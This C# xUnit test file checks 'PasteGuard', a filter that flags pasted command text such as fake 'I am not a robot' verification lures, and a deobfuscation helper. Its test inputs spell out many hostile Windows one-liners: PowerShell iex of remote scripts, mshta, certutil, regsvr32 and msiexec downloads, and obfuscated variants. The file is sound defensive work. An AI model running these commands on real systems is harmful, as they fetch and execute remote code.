using PasteGuard;
using Xunit;

namespace PasteGuard.Tests;

public class PreFilterTests
{
    [Theory]
    [InlineData("powershell -w hidden -c \"iex (irm https://example.com/a)\"")]
    [InlineData("mshta https://example.com/x.hta")]
    [InlineData("cmd /c curl -o a.exe http://203.0.113.1/a.exe && a.exe")]
    [InlineData("irm get.scoop.sh | iex")]
    [InlineData("regsvr32 /s /n /u /i:http://198.51.100.4/file.sct scrobj.dll")]
    [InlineData("certutil -urlcache -split -f http://x/a.exe a.exe")]
    [InlineData("conhost --headless cmd /c whoami")]
    [InlineData("finger verify@203.0.113.55")]
    [InlineData("p^o^w^e^r^s^h^e^l^l -c whoami")]
    [InlineData("& ('i'+'ex') 'x'")]
    [InlineData("msiexec /q /i https://example.com/a.msi")]
    [InlineData("rundll32.exe \\\\host@80\\share\\a.dll,Entry")]
    [InlineData("SyncAppvPublishingServer.vbs \"n; whoami\"")]
    [InlineData("PoWeRsHeLl -C whoami")]
    [InlineData("p\"\"ower\"\"shell -c whoami")]
    [InlineData("ｐｏｗｅｒｓｈｅｌｌ -c whoami")]
    [InlineData("pow​ershell -c whoami")]
    [InlineData("&(gcm i*x) 'whoami'")]
    [InlineData("&('{0}{1}'-f'i','ex') 'whoami'")]
    [InlineData("&('Invoke-WebRequest') 'x'")]
    [InlineData("$c=[char]105+[char]101+[char]120")]
    [InlineData(".($env:ComSpec[4,26,25]-join'') $x")]
    [InlineData("%ComSpec:~-7,3% /c whoami")]
    [InlineData("$r+=[char]($b -bxor 7)")]
    [InlineData("[ScriptBlock]::Create($s).Invoke()")]
    [InlineData("x /nop /w 2 /enc DQAKAFsAUwB5AHMAdABlAG0ALgBO")]
    [InlineData("x –ep bypass")]
    [InlineData("x -w mInImIzEd")]
    [InlineData("cmd /v:on /c \"set p=shell&power!p!\"")]
    [InlineData("net use Z: http://203.0.113.1/webdav")]
    [InlineData("<# I am not a robot - Cloudflare ID: 1 #> $k='a'")]
    public void Flags_command_like_text(string text) =>
        Assert.True(PreFilter.Check(text).IsCommandLike, text);

    [Theory]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData(null)]
    [InlineData("Meeting moved to 3pm tomorrow.")]
    [InlineData("git commit -m \"fix\" && git push")]
    [InlineData("npm install --save-dev typescript")]
    [InlineData("https://github.com/microsoft/winget-cli/releases")]
    [InlineData("sfc /scannow")]
    [InlineData("curl is a command line tool")]
    [InlineData("The comedy show was hilarious")]
    [InlineData("SELECT * FROM users WHERE id = 1")]
    [InlineData("C:\\Program Files\\App\\app.exe")]
    [InlineData("646126483")]
    [InlineData("Get-Command *python*")]
    [InlineData("echo hello | base64")]
    [InlineData("She said \"hello\" and left.")]
    [InlineData("{\"name\":\"value\",\"list\":[1,2,3]}")]
    [InlineData("# Release notes for the browser update")]
    public void Ignores_ordinary_text(string? text) =>
        Assert.False(PreFilter.Check(text).IsCommandLike, text ?? "<null>");

    [Fact]
    public void Reports_fake_verification_signal()
    {
        var result = PreFilter.Check("mshta https://x.example/a # I am not a robot - Verification ID 123");
        Assert.Contains("mshta", result.Indicators);
        Assert.Contains("fake-verification", result.Indicators);
    }

    [Theory]
    [InlineData("p^o^w^e^r^s^h^e^l^l", "powershell")]
    [InlineData("pow`ers`hell", "powershell")]
    [InlineData("'pow'+'ershell'", "'powershell'")]
    [InlineData("p\"\"owershell", "powershell")]
    [InlineData("c\"d\"n.example", "cdn.example")]
    [InlineData("ｉｅｘ", "iex")]
    [InlineData("i​ex", "iex")]
    [InlineData("–w h —ep", "-w h -ep")]
    [InlineData("‘x’ “y”", "'x' \"y\"")]
    [InlineData("http:/\\a https:\\\\b http:\\/c", "http://a https://b http://c")]
    public void Deobfuscate_undoes_common_tricks(string input, string expected) =>
        Assert.Equal(expected, PreFilter.Deobfuscate(input));

    [Fact]
    public void Corpus_malicious_samples_all_pass_the_prefilter()
    {
        var path = FindCorpus();
        var misses = File.ReadLines(path)
            .Where(l => l.Contains("\"label\":\"malicious\""))
            .Select(l => System.Text.Json.JsonDocument.Parse(l).RootElement.GetProperty("text").GetString()!)
            .Where(t => !PreFilter.Check(t).IsCommandLike)
            .ToList();
        Assert.Empty(misses);
    }

    internal static string FindCorpus()
    {
        var dir = new DirectoryInfo(AppContext.BaseDirectory);
        while (dir is not null && !File.Exists(Path.Combine(dir.FullName, "corpus", "samples.jsonl"))) dir = dir.Parent;
        return Path.Combine(dir?.FullName ?? throw new FileNotFoundException("corpus/samples.jsonl"), "corpus", "samples.jsonl");
    }
}
